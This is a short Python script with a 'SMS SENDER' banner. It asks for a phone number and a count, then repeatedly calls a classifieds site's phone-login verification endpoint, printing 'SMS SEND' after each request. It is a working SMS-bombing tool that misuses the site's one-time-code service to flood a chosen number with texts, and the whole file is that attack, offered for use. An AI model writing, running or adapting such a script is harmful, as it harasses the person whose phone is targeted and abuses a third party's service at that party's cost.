import requests
from requests.structures import CaseInsensitiveDict

number=str(input("""     
  \x1B[32m _____ __  __  _____    _____ ______ _   _ _____  ______ _____  
  / ____|  \/  |/ ____|  / ____|  ____| \ | |  __ \|  ____|  __ \ 
 | (___ | \  / | (___   | (___ | |__  |  \| | |  | | |__  | |__) |
  \___ \| |\/| |\___ \   \___ \|  __| | . ` | |  | |  __| |  _  / 
  ____) | |  | |____) |  ____) | |____| |\  | |__| | |____| | \ \ 
 |_____/|_|  |_|_____/  |_____/|______|_| \_|_____/|______|_|  \_\ \033[1;0m
                                                  
           \033[42m\033[1;30m================ main menu =================\033[0;m\n\n    
    \33[104m Enter You number :\033[1;0m """))
amount=int(input("    \33[104mEnter Amount:-\033[1;0m  "))


url1 = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone="+number

headers1 = CaseInsensitiveDict()
headers1["accept"] = "application/json, text/plain, */*"
headers1["application-name"] = "web"
headers1["referer"] = "https://bikroy.com/en/?login-modal=true&redirect-url=/"


for i in range(amount):
    resp1 = requests.get(url1, headers=headers1)
    print(str(i+    1)+(")                     SMS SEND"))